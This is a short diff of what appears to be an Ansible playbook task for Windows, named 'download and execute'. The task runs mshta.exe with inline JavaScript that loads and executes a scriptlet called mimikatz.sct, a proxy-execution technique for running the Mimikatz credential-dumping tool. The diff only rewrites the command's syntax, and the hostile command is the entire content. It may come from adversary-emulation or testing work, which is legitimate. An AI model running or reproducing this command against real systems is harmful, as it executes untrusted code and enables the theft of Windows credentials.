@@ -6,5 +6,5 @@
   tasks:
     - name: download and execute
       win_command: |
-        "c:\windows\system32\mshta.exe javascript:a=(GetObject(script:mimikatz.sct)).Exec();close();"
+        "c:\windows\system32\mshta.exe javascript:(GetObject(script:mimikatz.sct)).Exec()"
       
